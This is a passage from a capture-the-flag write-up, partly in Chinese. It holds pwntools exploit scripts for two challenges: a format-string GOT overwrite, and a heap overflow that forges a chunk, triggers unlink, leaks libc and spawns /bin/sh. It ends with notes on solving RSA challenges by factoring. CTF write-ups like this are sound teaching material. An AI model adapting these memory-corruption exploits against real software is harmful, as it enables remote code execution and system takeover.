DEBUG = 0 
got_overwrite = 0x0804B164 
# modify this 
if DEBUG: 
    io = process('./pwn200_bd081fbfb950838cd093174ce5e1cf78') 
else: 
    io = remote('58.213.63.30',50021) 
if DEBUG: context(log_level='DEBUG') 
# define symbols and offsets here 
# simplified r/s function 
def ru(delim): 
    return io.recvuntil(delim) 
def rn(count): 
    return io.recvn(count) 
def sl(data): 
    return io.sendline(data) 
def sn(data): 
    return io.send(data) 
def info(string): 
    return log.info(string) 
# define interactive functions here 
# define exploit function here 
def pwn(): 
    if DEBUG: gdb.attach(io) 
    ru(':') 
    sl('2') 
    ru('Exit\n') 
    sl('2') 
    for i in xrange(3): 
        ru('Protego\n') 
        sn('2') 
    sl(r'%' + str(got_overwrite) + 'c' + r'%' + '12$n') 
    sl(r'%' + str(0x0804A08E) + 'c' + r'%' + '24$n') 
    io.interactive() 
    return 
if __name__ == '__main__': 
    pwn() 
Pwn300(300) 
堆溢出，伪造堆块触发 unlink 改指针。 
脚本： 
#!/usr/bin/env python2 
# -*- coding:utf-8 -*- 
from pwn import * 
import os 
# switches 
DEBUG = 0 
# modify this 
if DEBUG: 
    io = process('./pwn300_96ced8ceb93c5ddae73f8ed9d17b90ba') 
else: 
    io = remote('58.213.63.30',61112) 
if DEBUG: context(log_level='debug') 
# define symbols and offsets here 
# simplified r/s function 
def ru(delim): 
    return io.recvuntil(delim) 
def rn(count): 
    return io.recvn(count) 
def sl(data): 
    return io.sendline(data) 
def sn(data): 
    return io.send(data) 
def info(string): 
    return log.info(string) 
# define interactive functions here 
def buy(size): 
    ru('Exit\n') 
    sl('1') 
    ru(':') 
    sl(str(size)) 
    return 
def show(index): 
    ru('Exit\n') 
    sl('2') 
    ru(':') 
    sl(str(index)) 
    return rn(0x100) 
def edit(index,content): 
    ru('Exit\n') 
    sl('3') 
    ru(':') 
    sl(str(index)) 
    ru(':') 
    sn(content) 
    return 
def delete(index): 
    ru('Exit\n') 
    sl('4') 
    ru(':') 
    sl(str(index)) 
    return 
ptr = 0x08049D80 
# define exploit function here 
def pwn(): 
    if DEBUG: gdb.attach(io) 
    buy(256) 
    buy(256) 
    buy(256) 
    PAD_SIZE = 260 
    payload1 = PAD_SIZE * 'A' + p32(0x109+8) 
    edit(0, payload1) 
    fakechunk = p32(0) + p32(0x81) + p32(ptr-4) + p32(ptr) + 0x70*'A' 
+ p32(0) + p32(0x80) 
    edit(2, fakechunk) 
    delete(1) 
    payload2 = 4*'A' + p32(0x08049D18) 
    edit(2, payload2) 
    buf = show(0) 
    free_addr = u32(buf[0:4]) 
    libc_addr = free_addr - 0x00076c60 
    offset_system = 0x00040190 
    system_addr = libc_addr + offset_system 
    edit(0, p32(system_addr)) 
    edit(1, '/bin/sh\x00') 
    delete(1) 
    io.interactive() 
    return 
if __name__ == '__main__': 
    pwn() 
CODE 
Code100(100) 
这题目真心的醉了。 
首先 openssl rsa -in public.key -pubin -modulus -text 分解出 n，e ，之后 yafu 用 factor 秒分
出 q，p，使用 rsatools.py 生成私钥
然后自己写脚本解密 
得到第一个密码。解压，同样的道理解密 n，e，yafu 分解，用 rastools 生成私钥，openssl 
rsautl -decrypt -in level2.passwd.enc -inkey private2.pem -out /tmp/passwd2 && cat 
/tmp/passwd2 解密得到密码 2，密码 3 同样
解压最后得到 flag： SCTF{500_sI,pLE_tRE1S7Re_iN_rSa_AtTa3K_2_24CASF} 
附上一血
Code150(150) 
写在前面的话：这个题目。。。我们使用的是主办方绝对不希望我们使用的方式。。。我
们当时也确实是没想到这个 gcd 的方式。。学习了，主办方应该是想考察我们数学功底，以
CRT 的原理中关于什么时候可以求解方程组为思路。但是我们纯粹变成了编程跑数据 
(⊙﹏⊙ )b 
首先尝试分解 10 个 n，发现一个都不能分解，自己写了一个基于 factor 的分解质数的
Python 脚本，在亚马逊云弄了一个 64 核服务器上跑到第二天上午，终于跑出来一组： 
208233691145562607629135888444718697257629858122159879938677836300514202410579
123850554827880163279784683180670782338440525997508131556443411233148827620575
240987329613828332152912665918246323928677161749679065443561440720511326593391
401558895698108850138514670560480036721650596404083949535730724315235568480779
580059715336189122197939145240779190585915864517161136377702450676875989310718
273447409369827761129861040511919226136160451028590442347896360585683966110309
666395619220367120019112385523916256587416596448880692447297292979272793843182
52191421446283531524990762609975988147922688946591302181753813360518031 = 
122281872221091773923842091258531471948886120336284482555605167683829690073110
898673260712865021244633908982705290201598907538975692920305239961645109897081
011524485706755794882283892011824006117276162119331970728229108731696164377808
170099285659797066904706924125871571157672409051718751812724929680249712137 * 
170289910812835465096338542997477487359435798641693381125276912070602548711328